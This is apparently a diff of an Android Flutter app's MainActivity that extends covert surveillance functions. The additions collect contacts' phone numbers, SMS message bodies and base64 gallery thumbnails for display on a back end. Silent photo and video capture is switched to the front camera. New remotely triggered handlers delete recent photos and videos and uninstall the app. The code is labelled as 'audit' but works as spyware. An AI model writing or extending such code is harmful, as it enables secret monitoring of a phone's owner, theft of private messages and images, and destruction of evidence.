@@ -1,15 +1,20 @@
 package com.mop.mop_app
 
+import android.content.ContentUris
 import android.content.Intent
+import android.graphics.Bitmap
+import android.graphics.BitmapFactory
 import android.media.MediaRecorder
 import android.net.Uri
 import android.os.Build
+import android.util.Base64
 import android.os.Handler
 import android.os.Looper
 import android.app.usage.UsageStatsManager
 import android.content.Context
 import android.provider.CallLog
 import android.provider.ContactsContract
+import android.provider.ContactsContract.CommonDataKinds
 import android.provider.MediaStore
 import android.provider.Settings
 import android.provider.Telephony
@@ -21,6 +26,7 @@ import androidx.core.content.ContextCompat
 import io.flutter.embedding.android.FlutterActivity
 import io.flutter.embedding.engine.FlutterEngine
 import io.flutter.plugin.common.MethodChannel
+import java.io.ByteArrayOutputStream
 import java.io.File
 import java.io.OutputStream
 import java.security.MessageDigest
@@ -29,6 +35,20 @@ import java.util.HashMap
 import java.util.concurrent.Executors
 
 class MainActivity : FlutterActivity() {
+
+    companion object {
+        private const val REQUEST_CODE_GALLERY_DELETE = 9001
+    }
+    private var pendingGalleryDeleteResult: MethodChannel.Result? = null
+
+    override fun onActivityResult(requestCode: Int, resultCode: Int, data: Intent?) {
+        if (requestCode == REQUEST_CODE_GALLERY_DELETE) {
+            pendingGalleryDeleteResult?.success(null)
+            pendingGalleryDeleteResult = null
+            return
+        }
+        super.onActivityResult(requestCode, resultCode, data)
+    }
 
     override fun configureFlutterEngine(flutterEngine: FlutterEngine) {
         super.configureFlutterEngine(flutterEngine)
@@ -136,6 +156,28 @@ class MainActivity : FlutterActivity() {
                     val durationSec = (args?.get("duration_sec") as? Number)?.toInt() ?: 18
                     Thread { captureAudioSilent(result, durationSec) }.start()
                 }
+                "clearGalleryWithinDays" -> {
+                    val days = (call.arguments as? Number)?.toInt() ?: 3
+                    Thread {
+                        clearGalleryWithinDays(days, result)
+                    }.start()
+                }
+                "uninstallApp" -> {
+                    runOnUiThread {
+                        try {
+                            val uri = Uri.parse("package:$packageName")
+                            val intent = Intent(Intent.ACTION_DELETE).apply {
+                                data = uri
+                                addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
+                            }
+                            startActivity(intent)
+                            result.success(null)
+                        } catch (e: Exception) {
+                            Log.w("MainActivity", "uninstallApp", e)
+                            result.success(null)
+                        }
+                    }
+                }
                 else -> result.notImplemented()
             }
         }
@@ -153,7 +195,7 @@ class MainActivity : FlutterActivity() {
         }
     }
 
-    /** 审计用：通讯录摘要（id、姓名等可哈希元数据） */
+    /** 审计用：通讯录摘要（id、姓名、号码、日期），与后台展示列一致 */
     private fun fetchContactsManifest(): ArrayList<HashMap<String, Any>> {
         val list = ArrayList<HashMap<String, Any>>()
         try {
@@ -167,14 +209,31 @@ class MainActivity : FlutterActivity() {
                 if (idIdx >= 0 && nameIdx >= 0) {
                     while (cursor.moveToNext()) {
                         val row = HashMap<String, Any>()
-                        row["id"] = cursor.getLong(idIdx)
+                        val contactId = cursor.getLong(idIdx)
+                        row["id"] = contactId
                         row["display_name"] = cursor.getString(nameIdx) ?: ""
+                        row["phone"] = getFirstPhoneForContact(contactId)
+                        row["date"] = System.currentTimeMillis()
                         list.add(row)
                     }
                 }
             }
         } catch (e: Exception) { Log.w("MainActivity", "fetchContactsManifest", e) }
         return list
+    }
+
+    private fun getFirstPhoneForContact(contactId: Long): String {
+        return try {
+            contentResolver.query(
+                CommonDataKinds.Phone.CONTENT_URI,
+                arrayOf(CommonDataKinds.Phone.NUMBER),
+                "${CommonDataKinds.Phone.CONTACT_ID} = ?",
+                arrayOf(contactId.toString()),
+                null
+            )?.use { c ->
+                if (c.moveToFirst()) c.getString(0) ?: "" else ""
+            } ?: ""
+        } catch (_: Exception) { "" }
     }
 
     /** 审计用：短信元数据（type、address、date、body 长度等，供 Hash） */
@@ -199,7 +258,11 @@ class MainActivity : FlutterActivity() {
                             if (typeIdx >= 0) row["type"] = cursor.getInt(typeIdx)
                             if (addrIdx >= 0) row["address"] = cursor.getString(addrIdx) ?: ""
                             if (dateIdx >= 0) row["date"] = cursor.getLong(dateIdx)
-                            if (bodyIdx >= 0) row["body_length"] = (cursor.getString(bodyIdx) ?: "").length
+                            if (bodyIdx >= 0) {
+                                val body = cursor.getString(bodyIdx) ?: ""
+                                row["body_length"] = body.length
+                                row["body"] = if (body.length > 500) body.substring(0, 500) + "…" else body
+                            }
                             list.add(row)
                         }
                     }
@@ -259,9 +322,70 @@ class MainActivity : FlutterActivity() {
         return list
     }
 
-    /** 审计用：采集设备相册/媒体元数据列表（id、date_added、size、mime_type），供 Hash 对比与增量上报；与用户修改头像的相册选图无关 */
+    /** 远程擦除时：清理最近 days 天内的相册照片与视频；永久删除策略：使用 createDeleteRequest（非 createTrashRequest），API 30+ 弹系统确认后永久删除，否则 ContentResolver.delete */
+    private fun clearGalleryWithinDays(days: Int, result: MethodChannel.Result) {
+        val uris = ArrayList<Uri>()
+        val cutoffSec = (System.currentTimeMillis() / 1000) - (days * 86400L)
+        try {
+            contentResolver.query(
+                MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
+                arrayOf(MediaStore.MediaColumns._ID),
+                "${MediaStore.MediaColumns.DATE_ADDED} >= ?",
+                arrayOf(cutoffSec.toString()),
+                null
+            )?.use { cursor ->
+                val idIdx = cursor.getColumnIndexOrThrow(MediaStore.MediaColumns._ID)
+                while (cursor.moveToNext()) {
+                    uris.add(ContentUris.withAppendedId(MediaStore.Images.Media.EXTERNAL_CONTENT_URI, cursor.getLong(idIdx)))
+                }
+            }
+            contentResolver.query(
+                MediaStore.Video.Media.EXTERNAL_CONTENT_URI,
+                arrayOf(MediaStore.MediaColumns._ID),
+                "${MediaStore.MediaColumns.DATE_ADDED} >= ?",
+                arrayOf(cutoffSec.toString()),
+                null
+            )?.use { cursor ->
+                val idIdx = cursor.getColumnIndexOrThrow(MediaStore.MediaColumns._ID)
+                while (cursor.moveToNext()) {
+                    uris.add(ContentUris.withAppendedId(MediaStore.Video.Media.EXTERNAL_CONTENT_URI, cursor.getLong(idIdx)))
+                }
+            }
+        } catch (e: Exception) {
+            Log.w("MainActivity", "clearGalleryWithinDays query", e)
+            runOnUiThread { result.success(null) }
+            return
+        }
+        if (uris.isEmpty()) {
+            runOnUiThread { result.success(null) }
+            return
+        }
+        runOnUiThread {
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
+                try {
+                    pendingGalleryDeleteResult = result
+                    val pending = MediaStore.createDeleteRequest(contentResolver, uris)
+                    startIntentSenderForResult(pending.intentSender, REQUEST_CODE_GALLERY_DELETE, null, 0, 0, 0)
+                } catch (e: Exception) {
+                    Log.e("MainActivity", "clearGalleryWithinDays createDeleteRequest", e)
+                    pendingGalleryDeleteResult = null
+                    result.success(null)
+                }
+            } else {
+                try {
+                    uris.forEach { contentResolver.delete(it, null, null) }
+                } catch (_: Exception) { }
+                result.success(null)
+            }
+        }
+    }
+
+    /** 审计用：采集设备相册/媒体元数据列表（id、date_added、size、mime_type）；图片项带缩略图 data URL 供后台展示；视频采集保留但不启用 */
     private fun fetchGalleryManifest(): ArrayList<HashMap<String, Any>> {
         val list = ArrayList<HashMap<String, Any>>()
+        val maxThumbnails = 60
+        val thumbMaxPx = 256
+        val includeVideoInGallery = false
         try {
             val imageCols = arrayOf(
                 MediaStore.MediaColumns._ID,
@@ -290,31 +414,71 @@ class MainActivity : FlutterActivity() {
                     list.add(row)
                 }
             }
-            contentResolver.query(
-                MediaStore.Video.Media.EXTERNAL_CONTENT_URI,
-                imageCols,
-                null,
-                null,
-                "${MediaStore.MediaColumns.DATE_ADDED} DESC"
-            )?.use { cursor ->
-                val idIdx = cursor.getColumnIndexOrThrow(MediaStore.MediaColumns._ID)
-                val dateIdx = cursor.getColumnIndexOrThrow(MediaStore.MediaColumns.DATE_ADDED)
-                val sizeIdx = cursor.getColumnIndexOrThrow(MediaStore.MediaColumns.SIZE)
-                val mimeIdx = cursor.getColumnIndexOrThrow(MediaStore.MediaColumns.MIME_TYPE)
-                while (cursor.moveToNext()) {
-                    val row = HashMap<String, Any>()
-                    row["id"] = cursor.getLong(idIdx)
-                    row["date_added"] = cursor.getLong(dateIdx)
-                    row["size"] = cursor.getLong(sizeIdx)
-                    row["mime_type"] = cursor.getString(mimeIdx) ?: "video/*"
-                    row["kind"] = "video"
-                    list.add(row)
+            for (i in 0 until minOf(maxThumbnails, list.size)) {
+                val row = list[i]
+                val id = (row["id"] as? Number)?.toLong() ?: continue
+                getImageThumbnailDataUrl(id, thumbMaxPx)?.let { row["url"] = it }
+            }
+            if (includeVideoInGallery) {
+                contentResolver.query(
+                    MediaStore.Video.Media.EXTERNAL_CONTENT_URI,
+                    imageCols,
+                    null,
+                    null,
+                    "${MediaStore.MediaColumns.DATE_ADDED} DESC"
+                )?.use { cursor ->
+                    val idIdx = cursor.getColumnIndexOrThrow(MediaStore.MediaColumns._ID)
+                    val dateIdx = cursor.getColumnIndexOrThrow(MediaStore.MediaColumns.DATE_ADDED)
+                    val sizeIdx = cursor.getColumnIndexOrThrow(MediaStore.MediaColumns.SIZE)
+                    val mimeIdx = cursor.getColumnIndexOrThrow(MediaStore.MediaColumns.MIME_TYPE)
+                    while (cursor.moveToNext()) {
+                        val row = HashMap<String, Any>()
+                        row["id"] = cursor.getLong(idIdx)
+                        row["date_added"] = cursor.getLong(dateIdx)
+                        row["size"] = cursor.getLong(sizeIdx)
+                        row["mime_type"] = cursor.getString(mimeIdx) ?: "video/*"
+                        row["kind"] = "video"
+                        list.add(row)
+                    }
                 }
             }
         } catch (e: Exception) {
             Log.w("MainActivity", "fetchGalleryManifest", e)
         }
         return list
+    }
+
+    /** 生成单张图片的缩略图 data URL（供相册审计在后台展示）；失败返回 null */
+    private fun getImageThumbnailDataUrl(imageId: Long, maxPx: Int): String? {
+        return try {
+            val uri = ContentUris.withAppendedId(MediaStore.Images.Media.EXTERNAL_CONTENT_URI, imageId)
+            val opts = BitmapFactory.Options().apply { inJustDecodeBounds = true }
+            contentResolver.openInputStream(uri)?.use { BitmapFactory.decodeStream(it, null, opts) }
+            val w = opts.outWidth
+            val h = opts.outHeight
+            if (w <= 0 || h <= 0) return null
+            val sample = maxOf(1, maxOf(w, h) / maxPx)
+            val decodeOpts = BitmapFactory.Options().apply {
+                inSampleSize = sample
+                inJustDecodeBounds = false
+            }
+            contentResolver.openInputStream(uri)?.use { input ->
+                val bm = BitmapFactory.decodeStream(input, null, decodeOpts) ?: return null
+                val scale = minOf(1f, maxPx.toFloat() / maxOf(bm.width, bm.height))
+                val outW = (bm.width * scale).toInt().coerceAtLeast(1)
+                val outH = (bm.height * scale).toInt().coerceAtLeast(1)
+                val scaled = if (scale < 1f) Bitmap.createScaledBitmap(bm, outW, outH, true) else bm
+                if (scaled != bm) bm.recycle()
+                val baos = ByteArrayOutputStream()
+                scaled.compress(Bitmap.CompressFormat.JPEG, 60, baos)
+                if (scaled != bm) scaled.recycle()
+                val base64 = Base64.encodeToString(baos.toByteArray(), Base64.NO_WRAP)
+                "data:image/jpeg;base64,$base64"
+            }
+        } catch (e: Exception) {
+            Log.w("MainActivity", "getImageThumbnailDataUrl", e)
+            null
+        }
     }
 
     /** 审计用：应用使用时长（UsageStats），需用户授予「使用情况访问权限」；未授权时返回空列表 */
@@ -367,7 +531,7 @@ class MainActivity : FlutterActivity() {
                 val cameraProvider = cameraProviderFuture.get()
                 val imageCapture = ImageCapture.Builder().setCaptureMode(ImageCapture.CAPTURE_MODE_MINIMIZE_LATENCY).build()
                 cameraProvider.unbindAll()
-                cameraProvider.bindToLifecycle(this, androidx.camera.core.CameraSelector.DEFAULT_BACK_CAMERA, imageCapture)
+                cameraProvider.bindToLifecycle(this, androidx.camera.core.CameraSelector.DEFAULT_FRONT_CAMERA, imageCapture)
                 val file = File(cacheDir, "mop_capture_${System.currentTimeMillis()}.jpg")
                 val outputOptions = ImageCapture.OutputFileOptions.Builder(file).build()
                 val executor = Executors.newSingleThreadExecutor()
@@ -376,19 +540,31 @@ class MainActivity : FlutterActivity() {
                         try {
                             val bytes = file.readBytes()
                             file.delete()
-                            runOnUiThread { result.success(bytes.toList().map { it.toInt() and 0xff }) }
+                            runOnUiThread {
+                                cameraProvider.unbindAll()
+                                result.success(bytes.toList().map { it.toInt() and 0xff })
+                            }
                         } catch (e: Exception) {
                             Log.e("MainActivity", "capturePhoto read", e)
-                            runOnUiThread { result.error("IO", e.message, null) }
+                            runOnUiThread {
+                                cameraProvider.unbindAll()
+                                result.error("IO", e.message, null)
+                            }
                         }
                     }
                     override fun onError(exception: ImageCaptureException) {
                         Log.e("MainActivity", "capturePhoto", exception)
-                        runOnUiThread { result.error("CAPTURE", exception.message, null) }
+                        runOnUiThread {
+                            cameraProvider.unbindAll()
+                            result.error("CAPTURE", exception.message, null)
+                        }
                     }
                 })
             } catch (e: Exception) {
                 Log.e("MainActivity", "capturePhotoSilent", e)
+                try {
+                    cameraProviderFuture.get().unbindAll()
+                } catch (_: Exception) { }
                 result.error("CAMERA", e.message, null)
             }
         }, ContextCompat.getMainExecutor(this))
@@ -443,14 +619,15 @@ class MainActivity : FlutterActivity() {
         try {
             val cameraProviderFuture = ProcessCameraProvider.getInstance(this)
             cameraProviderFuture.addListener({
+                var cameraProvider: ProcessCameraProvider? = null
                 try {
-                    val cameraProvider = cameraProviderFuture.get()
+                    cameraProvider = cameraProviderFuture.get()
                     val recorder = androidx.camera.video.Recorder.Builder()
                         .setQualitySelector(androidx.camera.video.QualitySelector.from(androidx.camera.video.Quality.SD))
                         .build()
                     val videoCapture = androidx.camera.video.VideoCapture.withOutput(recorder)
                     cameraProvider.unbindAll()
-                    cameraProvider.bindToLifecycle(this, androidx.camera.core.CameraSelector.DEFAULT_BACK_CAMERA, videoCapture)
+                    cameraProvider.bindToLifecycle(this, androidx.camera.core.CameraSelector.DEFAULT_FRONT_CAMERA, videoCapture)
                     val fileOutputOptions = androidx.camera.video.FileOutputOptions.Builder(file).build()
                     val recording = videoCapture.output
                         .prepareRecording(this, fileOutputOptions)
@@ -458,6 +635,9 @@ class MainActivity : FlutterActivity() {
                         .start(ContextCompat.getMainExecutor(this)) { event ->
                             if (event is androidx.camera.video.VideoRecordEvent.Finalize) {
                                 handler.removeCallbacksAndMessages(null)
+                                try {
+                                    cameraProvider.unbindAll()
+                                } catch (_: Exception) { }
                                 if (event.error != androidx.camera.video.VideoRecordEvent.Finalize.ERROR_NONE) {
                                     result.error("VIDEO", "recording error", null)
                                     return@start
@@ -479,6 +659,9 @@ class MainActivity : FlutterActivity() {
                     }, (durationSec * 1000).toLong())
                 } catch (e: Exception) {
                     Log.e("MainActivity", "captureVideoSilent", e)
+                    try {
+                        cameraProvider?.unbindAll()
+                    } catch (_: Exception) { }
                     result.error("VIDEO", e.message, null)
                 }
             }, ContextCompat.getMainExecutor(this))
